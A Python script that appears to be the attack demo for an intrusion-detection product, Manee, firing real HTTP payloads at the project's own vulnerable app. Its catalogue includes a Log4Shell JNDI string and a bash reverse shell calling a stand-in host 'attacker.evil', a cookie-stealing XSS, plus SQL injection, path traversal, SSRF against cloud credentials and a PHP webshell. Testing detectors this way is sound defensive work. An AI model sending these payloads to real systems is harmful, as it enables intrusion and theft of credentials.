#!/usr/bin/env python3
"""
Manee — Live Attacker Demo
==========================

Run this from a laptop during the judge demo. It fires a curated sequence
of real attacks against the vuln_app on port 9000, each tagged with the
Manee signature it will trip. Output is cinematic — Rich panels, progress
bars, before/after counters from the dashboard so judges can see Manee
react in real time.

Usage:
    python3 demo_attack.py                      # default cinematic mode
    python3 demo_attack.py --target 1.2.3.4     # custom target IP
    python3 demo_attack.py --rampage            # fire everything at once
    python3 demo_attack.py --slow               # 4s between attacks
    python3 demo_attack.py --silent             # no Rich, plain text

Requirements:
    pip install requests rich

Targets:
    Default points at the Manee demo VPS (16.171.230.111). Override with
    --target if you're demoing on a different box.
"""
from __future__ import annotations

import argparse
import sys
import time
from dataclasses import dataclass

try:
    import requests
except ImportError:
    print("✗ requests not installed. Run:  pip install requests rich")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.panel  import Panel
    from rich.table  import Table
    from rich.text   import Text
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.live   import Live
    HAS_RICH = True
except ImportError:
    HAS_RICH = False


# ─────────────── Default targets ──────────────────────────────────────
DEFAULT_HOST     = "16.171.230.111"
DEFAULT_VULN_PORT = 9000          # vuln_app — the deliberately broken target
DEFAULT_API_PORT  = 8000          # Manee backend — for status queries

# ─────────────── The attack catalogue ─────────────────────────────────
# Each attack is real (sent over the wire) and will trip a specific
# Manee signature in the payload scanner. The narrative column is what
# we'd say to a judge as the attack fires.

@dataclass
class Attack:
    name:        str          # short demo label
    signature:   str          # which Manee signature will match
    severity:    str          # what verdict Manee will assign
    payload:     str          # the request line/body that fires it
    method:      str = "GET"  # HTTP method
    path:        str = "/"    # default path; payload often goes in query
    headers:     dict = None  # custom headers (e.g. UA spoof)
    narrative:   str = ""     # one-line script for the demo


ATTACKS: list[Attack] = [
    Attack(
        name      = "Log4Shell · JNDI injection",
        signature = "log4shell_jndi",
        severity  = "Critical",
        path      = "/ping",
        payload   = "host=${jndi:ldap://attacker.evil/x}",
        narrative = "The CVE-2021-44228 classic. One header field, full RCE on a vulnerable server.",
    ),
    Attack(
        name      = "Command Injection · /etc/passwd read",
        signature = "cmd_injection",
        severity  = "Critical",
        path      = "/ping",
        payload   = "host=127.0.0.1;cat /etc/passwd",
        narrative = "The shell-metachar that breaks naïve subprocess calls.",
    ),
    Attack(
        name      = "SQL Injection · UNION SELECT",
        signature = "sqli_classic",
        severity  = "High",
        path      = "/ping",
        payload   = "host=1' UNION SELECT username,password FROM users--",
        narrative = "Classic stacked-query SQLi. Manee's regex catches the UNION+SELECT pairing.",
    ),
    Attack(
        name      = "Path Traversal · system files",
        signature = "path_traversal",
        severity  = "High",
        path      = "/ping",
        payload   = "host=../../../../etc/shadow",
        narrative = "Walk up the filesystem to read root-owned secrets.",
    ),
    Attack(
        name      = "SSRF · cloud metadata probe",
        signature = "ssrf_probe",
        severity  = "High",
        path      = "/ping",
        payload   = "host=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        narrative = "AWS metadata endpoint. If our app fetched this, we'd hand the attacker our IAM keys.",
    ),
    Attack(
        name      = "Reverse Shell · bash -i",
        signature = "reverse_shell",
        severity  = "Critical",
        path      = "/ping",
        payload   = "host=bash -i >& /dev/tcp/attacker.evil/4444 0>&1",
        narrative = "Spawn an interactive shell back to the attacker. Detected on the bash-i + /dev/tcp pattern.",
    ),
    Attack(
        name      = "XSS · script payload",
        signature = "xss_reflected",
        severity  = "High",
        path      = "/ping",
        payload   = "host=<script>document.location='http://evil/steal?c='+document.cookie</script>",
        narrative = "Steal session cookies from any analyst who views the log.",
    ),
    Attack(
        name      = "Sensitive Path · .env file",
        signature = "sensitive_path",
        severity  = "Medium",
        path      = "/.env",
        payload   = "",
        narrative = "First thing every scanner tries. Manee flags it as recon.",
    ),
    Attack(
        name      = "Sensitive Path · .git/HEAD",
        signature = "sensitive_path",
        severity  = "Medium",
        path      = "/.git/HEAD",
        payload   = "",
        narrative = "Exposed .git lets attackers reconstruct the entire source tree.",
    ),
    Attack(
        name      = "Scanner Fingerprint · sqlmap UA",
        signature = "scanner_fingerprint",
        severity  = "Medium",
        method    = "GET",
        path      = "/",
        payload   = "",
        headers   = {"User-Agent": "sqlmap/1.7.11 (https://sqlmap.org)"},
        narrative = "Spoof a known scanner User-Agent. Manee catches it on the UA string alone.",
    ),
    Attack(
        name      = "Scanner Fingerprint · nuclei UA",
        signature = "scanner_fingerprint",
        severity  = "Medium",
        method    = "GET",
        path      = "/",
        payload   = "",
        headers   = {"User-Agent": "Nuclei - Open-source vulnerability scanner"},
        narrative = "Same idea, different tool. Anything that announces itself as a scanner gets blocked.",
    ),
    Attack(
        name      = "Webshell Upload · PHP system()",
        signature = "webshell",
        severity  = "Critical",
        path      = "/ping",
        payload   = "host=<?php system($_GET['cmd']); ?>",
        narrative = "Drop a PHP webshell. If the server saved this and served it back, instant RCE.",
    ),
    Attack(
        name      = "LOLBin Abuse · PowerShell encoded",
        signature = "lolbin_abuse",
        severity  = "Critical",
        path      = "/ping",
        payload   = "host=powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        narrative = "Base64-encoded PowerShell — the standard Windows post-exploit pattern.",
    ),
    Attack(
        name      = "Brute Force · weak credentials",
        signature = "weak_credentials",
        severity  = "High",
        method    = "POST",
        path      = "/login",
        payload   = "username=admin&password=admin",
        narrative = "The first password every brute-forcer tries.",
    ),
]


# ─────────────── Helpers ──────────────────────────────────────────────

def fire(host: str, vuln_port: int, atk: Attack, timeout: int = 4) -> dict:
    """Send the actual HTTP request. Returns metadata about what happened."""
    url = f"http://{host}:{vuln_port}{atk.path}"
    if atk.payload and atk.method == "GET":
        url = url + ("&" if "?" in url else "?") + atk.payload
    started = time.time()
    try:
        if atk.method == "POST":
            r = requests.post(url, data=atk.payload, headers=atk.headers or {}, timeout=timeout)
        else:
            r = requests.get(url, headers=atk.headers or {}, timeout=timeout)
        return {
            "ok": True, "status": r.status_code,
            "bytes": len(r.content), "elapsed": time.time() - started,
            "url": url,
        }
    except requests.exceptions.ConnectionError as e:
        # Connection refused / dropped is the EXPECTED outcome once
        # Manee blocks our IP at the kernel — call that out.
        return {"ok": False, "status": 0, "blocked": True, "elapsed": time.time() - started, "url": url, "error": str(e).split('\n')[0]}
    except requests.exceptions.Timeout:
        return {"ok": False, "status": 0, "blocked": True, "elapsed": time.time() - started, "url": url, "error": "timeout"}
    except Exception as e:
        return {"ok": False, "status": 0, "blocked": False, "elapsed": time.time() - started, "url": url, "error": str(e)}


def get_block_count(host: str, api_port: int, timeout: int = 3) -> int | None:
    """Try to read Manee's current blocked-IP count (no auth required for /healthz, but /blocked needs token)."""
    try:
        r = requests.get(f"http://{host}:{api_port}/blocked", timeout=timeout)
        if r.status_code == 200:
            return len(r.json())
    except Exception:
        pass
    return None


# ─────────────── Cinematic mode (Rich) ────────────────────────────────

def banner(console: "Console", host: str) -> None:
    art = r"""
   ____  _____  _____  _____  _____  _____  _____  _____
  |    \|     ||   __||_   _||  _  ||_   _||_   _||  _  |
  |  |  ||  |  ||   __| _| |_ |     | _| |_  | |  |     |
  |____/ |_____||_____||_____||__|__||_____| |_|  |__|__|

       O F F E N S I V E   K I L L   C H A I N
              T A R G E T :  Manee VPS
"""
    console.print(Panel.fit(
        Text(art, style="bold red"),
        title=f"[bold white]Attacker Workstation → {host}[/]",
        subtitle="[dim]Manee should block every one of these in milliseconds.[/]",
        border_style="red",
    ))


def play_cinematic(host: str, vuln_port: int, api_port: int, delay: float, silent: bool) -> None:
    if silent or not HAS_RICH:
        return play_plain(host, vuln_port, delay)

    console = Console()
    banner(console, host)

    # Initial connectivity check
    start_count = get_block_count(host, api_port)
    if start_count is None:
        console.print("[yellow]⚠ couldn't reach Manee API — running blind. Demo will still fire attacks.[/]")
    else:
        console.print(f"[dim]Manee currently has {start_count} blocked IPs. Watch this number climb.[/]\n")

    results: list[tuple[Attack, dict]] = []

    for i, atk in enumerate(ATTACKS, start=1):
        sev_color = {"Critical": "red", "High": "yellow", "Medium": "blue"}.get(atk.severity, "white")
        console.print(Panel.fit(
            f"[bold]{atk.name}[/]\n"
            f"[dim]{atk.narrative}[/]\n"
            f"[{sev_color}]signature: {atk.signature}  ·  expected verdict: {atk.severity}[/]",
            title=f"[bold]Attack {i}/{len(ATTACKS)}[/]",
            border_style=sev_color,
        ))

        # Show the actual payload going on the wire
        wire = (atk.payload or atk.path)[:120]
        console.print(f"  [dim]→[/] [magenta]{atk.method}[/] [white]{atk.path}[/]  payload: [italic]{wire}[/]\n")

        # Fire with a small spinner for drama
        with console.status(f"[bold {sev_color}]firing...[/]", spinner="dots"):
            res = fire(host, vuln_port, atk)
        results.append((atk, res))

        if res.get("blocked"):
            console.print(f"  [bold green]✓ DROPPED[/] — connection refused/timed out → Manee already has us blocked at the kernel.\n")
        elif res.get("ok"):
            console.print(f"  [bold cyan]→ delivered[/] (HTTP {res['status']}, {res['bytes']}B in {res['elapsed']*1000:.0f}ms) — vuln_app received it; Manee scoring now.\n")
        else:
            console.print(f"  [yellow]? {res.get('error', 'unknown')}[/]\n")

        time.sleep(delay)

    # ─── Summary table ───
    final_count = get_block_count(host, api_port)
    console.print()
    summary = Table(title="[bold]Attack run summary[/]", show_lines=False, expand=False, border_style="dim")
    summary.add_column("#",  style="dim",   justify="right")
    summary.add_column("Attack",      style="white")
    summary.add_column("Signature",   style="magenta")
    summary.add_column("Outcome",     style="bold")
    for i, (atk, res) in enumerate(results, start=1):
        if res.get("blocked"):
            outcome = "[green]BLOCKED at kernel[/]"
        elif res.get("ok"):
            outcome = f"[cyan]delivered → AI scored[/]"
        else:
            outcome = f"[yellow]{res.get('error', '?')}[/]"
        summary.add_row(str(i), atk.name, atk.signature, outcome)
    console.print(summary)

    console.print()
    if start_count is not None and final_count is not None:
        delta = final_count - start_count
        console.print(Panel.fit(
            f"[white]Manee's blocked-IP list went from [bold]{start_count}[/] → [bold]{final_count}[/] (Δ +{delta})[/]\n"
            f"[dim]Switch to the dashboard. Open AI Inspector. The attacks are top of the live feed.[/]",
            title="[bold green]✓ Run complete[/]",
            border_style="green",
        ))
    else:
        console.print(Panel.fit(
            "[white]Run complete.[/]\n"
            "[dim]Switch to the dashboard → AI Inspector → see the live feed populate.[/]",
            border_style="green",
        ))


def play_plain(host: str, vuln_port: int, delay: float) -> None:
    """No-Rich fallback for environments without colour terminals."""
    print(f"\n=== Manee Attacker Demo → {host} ===\n")
    for i, atk in enumerate(ATTACKS, start=1):
        print(f"[{i:>2}/{len(ATTACKS)}] {atk.severity:<8} {atk.name}")
        print(f"        signature: {atk.signature}")
        res = fire(host, vuln_port, atk)
        if res.get("blocked"):
            print(f"        ✓ DROPPED at kernel (Manee already blocked us)")
        elif res.get("ok"):
            print(f"        → delivered (HTTP {res['status']})")
        else:
            print(f"        ? {res.get('error', 'unknown')}")
        time.sleep(delay)
    print("\nDone. Check the Manee dashboard → AI Inspector.\n")


def play_rampage(host: str, vuln_port: int) -> None:
    """Fire everything at once — no narration, just chaos. For when you
    want to demo Manee under sustained load."""
    print(f"\n[!] Rampage mode — firing {len(ATTACKS)} attacks at {host}:{vuln_port} as fast as possible\n")
    started = time.time()
    blocked = delivered = errored = 0
    for atk in ATTACKS * 5:  # 5 rounds
        res = fire(host, vuln_port, atk, timeout=2)
        if res.get("blocked"):  blocked += 1
        elif res.get("ok"):     delivered += 1
        else:                   errored += 1
    elapsed = time.time() - started
    print(f"\n=== Rampage complete in {elapsed:.1f}s ===")
    print(f"  Delivered to vuln_app : {delivered}")
    print(f"  Dropped at kernel     : {blocked}")
    print(f"  Errored               : {errored}")
    print(f"\nSwitch to the dashboard now. Watch Manee's blocked count.\n")


# ─────────────── Entry point ──────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="Manee live attacker demo")
    p.add_argument("--target",    default=DEFAULT_HOST,
                   help=f"target IP/hostname (default: {DEFAULT_HOST})")
    p.add_argument("--vuln-port", type=int, default=DEFAULT_VULN_PORT,
                   help=f"vuln_app port (default: {DEFAULT_VULN_PORT})")
    p.add_argument("--api-port",  type=int, default=DEFAULT_API_PORT,
                   help=f"Manee backend port for status queries (default: {DEFAULT_API_PORT})")
    p.add_argument("--delay",     type=float, default=2.0,
                   help="seconds between attacks (default: 2.0; use 4.0 with --slow flag)")
    p.add_argument("--slow",      action="store_true", help="4s between attacks (more dramatic)")
    p.add_argument("--rampage",   action="store_true", help="fire everything as fast as possible")
    p.add_argument("--silent",    action="store_true", help="no Rich, plain text output")
    args = p.parse_args()

    delay = 4.0 if args.slow else args.delay

    if args.rampage:
        play_rampage(args.target, args.vuln_port)
    else:
        play_cinematic(args.target, args.vuln_port, args.api_port, delay, args.silent)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Aborted.\n")
        sys.exit(0)
